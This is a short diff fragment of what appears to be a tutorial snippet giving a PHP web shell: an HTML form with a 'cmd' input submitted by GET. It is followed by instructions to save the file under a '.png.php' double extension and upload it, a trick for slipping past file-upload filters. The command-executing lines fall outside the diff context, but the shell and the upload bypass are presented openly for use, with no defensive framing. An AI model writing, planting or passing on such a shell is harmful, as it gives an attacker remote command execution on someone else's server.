@@ -3,7 +3,7 @@
 
 use this code:
 
-//<html>
+<html>
 <body>
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
@@ -18,7 +18,7 @@ use this code:
 ?>
 </pre>
 </body>
-</html>//
+</html>
 now you create a new file that has name <yournamefile>.png.php
 and then upload
 
